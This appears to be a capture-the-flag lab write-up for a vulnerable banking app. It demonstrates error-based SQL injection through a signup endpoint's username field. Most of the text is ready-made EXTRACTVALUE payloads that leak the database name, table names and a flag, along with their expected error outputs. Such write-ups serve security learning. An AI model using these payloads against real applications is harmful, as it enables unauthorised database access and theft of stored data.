SQL Injection - Signup Endpoint
Vulnerability

The /api/v1.0/user registration endpoint is vulnerable to SQL injection in the username field. User input is passed directly into a MySQL query without sanitization.
Step 1 - Confirm the Vulnerability

Send a registration request in Burp with a single quote in the username:
json

{
  "firstname": "a",
  "lastname": "a",
  "username": "test'",
  "email": "test@test.com",
  "password": "password"
}
```

**Expected result:** 500 error with MySQL syntax error in the response:
```
{"message":"Server error: 1064 (42000): You have an error in your SQL syntax..."}

This confirms the field is injectable.
Step 2 - Extract the Database Name

Use EXTRACTVALUE to leak data through the error message:
json

{
  "firstname": "a",
  "lastname": "a",
  "username": "test1' AND EXTRACTVALUE(1,concat(0x7e,database()))-- -",
  "email": "test@test.com",
  "password": "password"
}
```

**Expected result:**
```
{"message":"Server error: 1105 (HY000): XPATH syntax error: '~trybankmedbs'"}

The value after ~ is the database name.
Step 3 - Extract Table Names
json

{
  "firstname": "a",
  "lastname": "a",
  "username": "test2' AND EXTRACTVALUE(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -",
  "email": "test@test.com",
  "password": "password"
}
```

**Expected result:**
```
{"message":"Server error: 1105 (HY000): XPATH syntax error: '~Flags,Users'"}

Step 4 - Extract the Flag
json

{
  "firstname": "a",
  "lastname": "a",
  "username": "test3' AND EXTRACTVALUE(1,concat(0x7e,(SELECT flag FROM Flags)))-- -",
  "email": "test@test.com",
  "password": "password"
}
```

**Expected result:**
```
{"message":"Server error: 1105 (HY000): XPATH syntax error: '~THM{6a17de51-099a-44e0-94cc-fc6'"}

⚠️ EXTRACTVALUE truncates at 32 characters. Get the second half:
json

{
  "firstname": "a",
  "lastname": "a",
  "username": "test4' AND EXTRACTVALUE(1,concat(0x7e,(SELECT substring(flag,32) FROM Flags)))-- -",
  "email": "test@test.com",
  "password": "password"
}

Combine both halves to get the full flag.
Important Notes

    Change the username prefix each request (test1, test2, test3...) because usernames must be unique — duplicate usernames return 401
    0x7e is the hex value for ~ used as a separator to read extracted data clearly
    EXTRACTVALUE leaks data through MySQL error messages — no need to read a normal response

Why This Works

The backend constructs a query like:
sql

SELECT * FROM Users WHERE username = '[USER INPUT]'

By injecting ' AND EXTRACTVALUE(...)-- - the query becomes:
sql

SELECT * FROM Users WHERE username = '' AND EXTRACTVALUE(...)-- -'

The EXTRACTVALUE function intentionally throws an error containing our extracted data.
